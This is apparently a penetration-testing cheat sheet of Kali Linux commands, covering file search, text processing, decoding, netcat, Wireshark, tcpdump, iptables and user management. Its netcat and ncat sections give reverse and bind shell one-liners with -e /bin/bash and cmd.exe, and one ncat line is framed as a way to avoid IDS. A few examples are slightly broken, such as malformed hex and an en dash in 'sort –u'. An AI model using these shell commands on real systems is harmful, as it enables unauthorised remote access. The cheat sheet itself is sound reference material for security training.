# Kali Linux Commands

- Set the Target IP Address to the `$ip` system variable

```Shell
export ip=192.168.1.100
```

- Find the location of a file

```Shell
locate sbd.exe
```

- Search through directories in the `$PATH` environment variable

```Shell
which sbd
```

- Find a search for a file that contains a specific string in it’s name:

```Shell
find / -name sbd\*
```

- Show active internet connections

```Shell
netstat -lntp
```

- Change Password

```Shell
passwd
```

- Verify a service is running and listening

```Shell
netstat -antp |grep apache
```

- Start a service

```Shell
systemctl start ssh
```

```Shell
systemctl start apache2
```

- Have a service start at boot

```Shell
systemctl enable ssh
```

- Stop a service

```Shell
systemctl stop ssh
```

- Unzip a gz file

```Shell
gunzip access.log.gz
```

- Unzip a tar.gz file

```Shell
tar -xzvf file.tar.gz
```

- Search command history

```Shell
history | grep phrase_to_search_for
```

- Download a webpage

```Shell
wget http://www.cisco.com
```

- Open a webpage

```Shell
curl http://www.cisco.com
```

- Print all files content in a directory

```Shell
find . -print0 | while read -d $'\0' file; do cat $file; done
```

## String manipulation

- Count number of lines in file

```Shell
wc -l index.html
```

- Get the start or end of a file

```Shell
head index.html
```

```Shell
tail index.html
```

- Extract all the lines that contain a string

```Shell
grep "href=" index.html
```

- Pick all strings from a binary file

```Shell
strings <file_name> | grep <searched text>
```

- Count unique lines in file

```Shell
sort ips.txt | uniq -c | sort -bgr
```

- Concatenate lines

```Shell
cat <file name> | paste -sd "" -

cat <file name> | paste -sd "," -
```

- Cut a string by a delimiter, filter results then sort

```Shell
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u
```

- Using Grep and regular expressions and output to a file

```Shell
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt
```

- Use a bash loop to find the IP address behind each host

```Shell
for url in $(cat list.txt); do host $url; done
```

- Collect all the IP Addresses from a log file and sort by frequency

```Shell
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
```

## Decoding using Kali

- Decode Base64 Encoded Values

```Shell
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
```

- Decode Hexidecimal Encoded Values

```Shell
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
```

- ROT13 file content

```Shell
cat <file_name> | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

- Extracting a password from a hex dump file

```Shell
# reverse hexdump
$ xxd -r data.txt foobar.bin

$ zcat foobar.bin | file -
bzip2 compressed data, block size = 900k

$ zcat foobar.bin | bzcat | file -
gzip compressed data, was "data4.bin", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression

$ zcat foobar.bin | bzcat | zcat | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | file -
bzip2 compressed data, block size = 900k

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | file -
gzip compressed data, was "data9.bin", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | file -
ASCII text

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | cat -
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

## Networking

- Manage network interfaces

```Shell
vi /etc/network/interfaces
```

- Set static ip

```Shell
vi /etc/network/interfaces

# The primary network interface
auto eth0
iface eth0 inet static
address 10.0.0.100
netmask 255.255.255.0
gateway 10.0.0.1
```
Restart networking with `$ service networking restart`

## Netcat - Read and write TCP and UDP Packets

- Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

- Connect to a POP3 mail server

```Shell
nc -nv $ip 110
```

- Listen on TCP/UDP port

```Shell
nc -nlvp 4444
```

- Connect to a netcat port

```Shell
nc -nv $ip 4444
```

- Send a file using netcat

```Shell
nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe
```

- Receive a file using netcat

```Shell
nc -nlvp 4444 > incoming.exe
```

- Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...

  `$ whereis nc`

  nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

  /bin/nc.traditional -e /bin/bash 1.2.3.4 4444

- Create a reverse shell with Ncat using cmd.exe on Windows

```Shell
nc.exe -nlvp 4444 -e cmd.exe
```

or

```Shell
nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
```

- Create a reverse shell with Ncat using bash on Linux

```Shell
nc -nv $ip 4444 -e /bin/bash
```

- Netcat for Banner Grabbing:

```Shell
echo "" | nc -nv -w1 <IP Address> <Ports>
```

## Ncat - Netcat for Nmap project which provides more security avoid IDS

- Reverse shell from windows using cmd.exe using ssl

```Shell
ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
```

- Listen on port 4444 using ssl

```Shell
ncat -v $ip 4444 --ssl
```

## Wireshark

- Show only SMTP (port 25) and ICMP traffic:

```Shell
tcp.port eq 25 or icmp
```

- Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:

```Shell
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16
```

- Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:

```Shell
ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip
```

- Some commands are equal

```Shell
ip.addr == xxx.xxx.xxx.xxx
```

Equals

```Shell
ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx
```

```Shell
 ip.addr != xxx.xxx.xxx.xxx
```

Equals

```Shell
ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx
```

## Tcpdump

- Display a pcap file

```Shell
tcpdump -r passwordz.pcap
```

- Display ips and filter and sort

```Shell
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head
```

- Grab a packet capture on port 80

```Shell
tcpdump tcp port 80 -w output.pcap -i eth0
```

- Check for ACK or PSH flag set in a TCP packet

```Shell
tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap
```

## IPTables

- Deny traffic to ports except for Local Loopback

```Shell
iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP
```


```Shell
iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP
```

- Clear ALL IPTables firewall rules

```Shell
  iptables -P INPUT ACCEPT
  iptables -P FORWARD ACCEPT
  iptables -P OUTPUT ACCEPT
  iptables -t nat -F
  iptables -t mangle -F
  iptables -F
  iptables -X
  iptables -t raw -F iptables -t raw -X
```

## Users manipulation

- Adding a new user

```Shell
adduser <user name>
```

- Adding a User to the sudoers File

```Shell
adduser <user name> sudo
```

- Switching Users

```Shell
su <user name>
```
